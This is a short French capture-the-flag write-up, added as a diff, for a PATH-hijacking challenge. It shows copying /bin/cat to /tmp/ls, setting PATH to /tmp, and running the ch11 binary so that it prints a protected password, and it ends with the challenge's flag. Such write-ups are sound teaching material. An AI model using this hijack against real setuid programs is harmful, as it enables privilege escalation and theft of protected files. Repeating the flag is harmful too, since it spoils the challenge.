@@ -1,0 +1,13 @@
+Afin d’exécuter `cat` à la place de `ls` il suffit de copier l’exécutable dans `/tmp`
+
+###### app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls ######
+
+puis de changer la valeur de la variable d’environnement `PATH`
+#####   app-script-ch11@challenge02:~$ PATH=/tmp#  ####
+#####   app-script-ch11@challenge02:~$ echo $PATH  #####
+/tmp
+
+Donc lorsque on exécutera une nouvelle fois le fichier `ch11` il lancera le programme `/tmp/ls` qui est une copie de `/bin/cat` et affichera donc le mot de passe !
+#####   app-script-ch11@challenge02:~$ ./ch11      #####
+
+Flag : !oPe96a/.s8d5
